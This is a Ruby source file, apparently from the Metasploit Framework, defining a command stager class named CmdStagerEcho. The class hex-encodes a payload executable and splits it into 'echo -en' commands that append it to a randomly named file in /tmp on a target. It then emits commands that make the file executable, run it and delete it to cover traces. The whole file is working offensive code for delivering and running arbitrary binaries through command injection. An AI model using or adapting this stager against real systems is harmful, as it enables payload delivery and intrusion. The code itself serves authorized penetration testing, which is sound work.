# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

class CmdStagerEcho < CmdStagerBase

  def initialize(exe)
    super

    @var_elf = Rex::Text.rand_text_alpha(5)
  end

  #
  # Override to ensure opts[:temp] is a correct *nix path
  #
  def generate(opts = {})
    opts[:temp] = opts[:temp] || '/tmp/'
    opts[:temp].gsub!(/\\/, "/")
    opts[:temp].gsub!(/'/, "\\\\'")
    opts[:temp].gsub!(/ /, "\\ ")
    opts[:temp] << '/' if opts[:temp][-1,1] != '/'
    super
  end

  #
  # Override to set the extra byte count
  #
  def generate_cmds(opts)
    # Set the start/end of the commands here (vs initialize) so we have @tempdir
    @cmd_start = "echo -en "
    @cmd_end   = ">>#{@tempdir}#{@var_elf}"
    xtra_len = @cmd_start.length + @cmd_end.length + 1
    opts.merge!({ :extra => xtra_len })
    super
  end


  #
  # Encode into a "\\x55\\xAA" hex format that echo understands, where
  # interpretation of backslash escapes are enabled
  #
  def encode_payload(opts)
    return Rex::Text.to_hex(@exe, "\\\\x")
  end


  #
  # Combine the parts of the encoded file with the stuff that goes
  # before ("echo -en ") / after (">>file") it.
  #
  def parts_to_commands(parts, opts)
    cmds = []
    parts.each do |p|
      cmd = ''
      cmd << @cmd_start
      cmd << p
      cmd << @cmd_end
      cmds << cmd
    end

    cmds
  end

  #
  # Since the binary has been already dropped to fs, just execute and
  # delete it
  #
  def generate_cmds_decoder(opts)
    cmds = []
    # Make it all happen
    cmds << "chmod +x #{@tempdir}#{@var_elf}"
    cmds << "#{@tempdir}#{@var_elf}"

    # Clean up after unless requested not to..
    if (not opts[:nodelete])
      cmds << "rm -f #{@tempdir}#{@var_elf}"
    end

    return cmds
  end

  #
  # Override it to ensure that the hex representation of a byte isn't cut
  #
  def slice_up_payload(encoded, opts)
    tmp = encoded.dup

    parts = []
    xtra_len = opts[:extra]
    xtra_len ||= 0
    while (tmp.length > 0)
      temp = tmp.slice(0, (opts[:linemax] - xtra_len))
      # cut the end of the part until we reach the start
      # of a full byte representation "\\xYZ"
      while temp[-5, 3] != "\\\\x"
        temp.chop!
      end
      parts << temp
      tmp.slice!(0, temp.length)
    end

    parts
  end

  def cmd_concat_operator
    " ; "
  end

end
end
end
